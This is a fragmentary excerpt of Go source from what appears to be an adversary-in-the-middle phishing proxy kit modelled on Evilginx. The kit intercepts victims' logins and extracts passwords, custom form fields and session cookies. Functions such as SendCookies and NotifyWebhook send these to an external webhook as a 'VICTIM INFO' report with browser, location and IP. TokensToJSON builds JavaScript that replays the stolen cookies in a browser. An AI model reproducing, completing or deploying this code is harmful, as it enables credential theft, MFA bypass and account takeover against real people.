...
func (p *HttpProxy) SendCookies(msg string, email string, pass string, customVal map[string]string) {
	...
	json.NewDecoder(resp.Body).Decode(&dataMap)
	...
	if len(customVal) > 0 {
		...
		for k, v := range customVal {
			// Skip adding email/username if it's the only entry
			if k == "Username" && v == email && len(customVal) == 1 {
				continue
			}
			rows = append(rows, fmt.Sprintf(" [%s] :  %s", k, v))
		}

		// Only add the custom section if there are other values remaining
		if len(rows) > 0 {
			custom = fmt.Sprintf("[ %s ]\n%s\n", "Custom:", strings.Join(rows, "\n"))
		}
	}

	NewMessage := "🍪 ======[ Evolcorp MDR 🪤 ]====== 🍪\n\n" +
		"📪 Email: " + email + "\n" +
		"🔑 Password: " + pass + "\n" +
		custom +
		"=======[ 👤 VICTIM INFO 🌍 ]=======\n" +
		"🖥️ Browser: " + p.victimBrowser + "\n" +
		"🗺 Location: " + dataMap.City + ", " + dataMap.Region + ", " + dataMap.Country + zip + "\n" +
		"📅 Date: " + formattedTime + "\n" +
		"📍 IP: " + p.victimIpInfo + "\n" +
		"📦 Token Delivery.\n" +
...
func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
								...
								if !p.isForwarderUrl(req.URL) {
									...
									if _, err := os.Stat(index_found); !os.IsNotExist(err) {
										...
										if err == nil {
											...
											body := string(html)
											bodyBytes := []byte(html)
											body = string(p.cfg.replaceHooks(bodyBytes))
						...
						if json_re.MatchString(contentType) {
							...
							if pl.password.tp == "json" {
								...
								if pm != nil && len(pm) > 1 {
									...
									if ok {
										if len(pm) > 1 {
											if cfg.general.Verbosity == 2 && p.vicPassword != pm[1] && s.Username != "" {

												resMsg := fmt.Sprintf("PasswordEmail: "+s.Username+"\nPassword: %s\n***************%d***************", pm[1], ps.Index)
												p.NotifyWebhook(resMsg)
											}
										}
									}
								...
								if cp.tp == "json" {
									...
									if cm != nil && len(cm) > 1 {
										...
										if ok {
											...
											if username, _ := s.Custom["Username"]; username != "" {
												rows = append(rows, fmt.Sprintf("[Username]: %s", username))
											}

											// Check if 'Password' key exists
											if password, ok := s.Custom["Password"]; ok && password != "" {
												// The key "Password" exists, and the password is not empty.
												rows = append(rows, fmt.Sprintf("[Password]: %s", password))
												custom := fmt.Sprintf("[ %s ]\n%s\n", "Custom", strings.Join(rows, "\n"))

												if len(custom) > 0 && cfg.general.Verbosity == 2 {
													p.NotifyWebhook(fmt.Sprintf(`%s`, custom))
												}
											} else if password, ok := s.Custom["password"]; ok && password != "" {
												// The key "password" exists, and the password is not empty.
												rows = append(rows, fmt.Sprintf("[Password]: %s", password))
												custom := fmt.Sprintf("[ %s ]\n%s\n", "Custom", strings.Join(rows, "\n"))
	...
	p.Proxy.OnResponse().
		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
			...
			// Check Access-Control-Allow-Origin header for non-OPTIONS requests
			...
			if is_cookie_auth && is_body_auth && is_http_auth {
				...
				if s, ok := p.sessions[ps.SessionId]; ok {
					// Only do it if not done AND not already sent
					if !s.IsDone && !s.TokensSent {
						...
						if len(s.CookieTokens) > 0 {
							p.SendCookies(TokensToJSON(pl, s.CookieTokens), s.Username, s.Password, s.Custom)
						}

						s.Finish(false)     // sets s.IsDone = true
						s.TokensSent = true // now we've sent them
					}
				}
			}
...
func TokensToJSON(pl *Phishlet, tokens map[string]map[string]*database.CookieToken) string {
	...
	(() => {
		...
		for (let cookie of cookies) {
			setCookie(cookie.name, cookie.value, cookie.domain, cookie.path, cookie.httpOnly);
		}
	})();
	`
